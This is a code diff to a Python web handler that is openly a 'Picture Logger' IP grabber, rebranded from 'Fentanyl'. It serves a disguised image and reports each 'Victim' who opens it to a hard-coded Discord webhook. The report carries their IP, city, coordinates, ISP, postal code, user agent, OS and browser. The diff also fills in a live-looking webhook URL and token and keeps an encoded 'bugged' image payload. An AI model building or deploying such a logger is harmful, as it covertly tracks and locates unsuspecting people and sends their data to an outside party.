@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'WEBHOOK'
+webhook = 'https://discord.com/api/webhooks/989954667792433193/1Xl1maV-f8TyRYd83Og_KIcOW_Xc3cSiadclhc23vinkf4QUCU-rr219q9e5X0xBV5-u'
 
-bindata = httpx.get('link to image here').content
+bindata = httpx.get('https://canarytokens.com/feedback/traffic/yci8mo57K5obtpos3cmpdw11e/contact.php').content
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
@@ -14,11 +14,11 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "The Picture Logger strikes again!",
       "color": 16711803,
-      "description": "A Victim opened the original Image. You can find their info below.",
+      "description": "A Victim opened the original Picture. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "The Picture Logger"
       },
       "fields": [
         {
@@ -42,11 +42,11 @@ def prev(ip,uag):
   "content": "",
   "embeds": [
     {
-      "title": "Fentanyl Alert!",
+      "title": "The Picture Logger Alert!",
       "color": 16711803,
       "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
-        "name": "Fentanyl"
+        "name": "The Picture Logger"
       },
       "fields": [
       ]
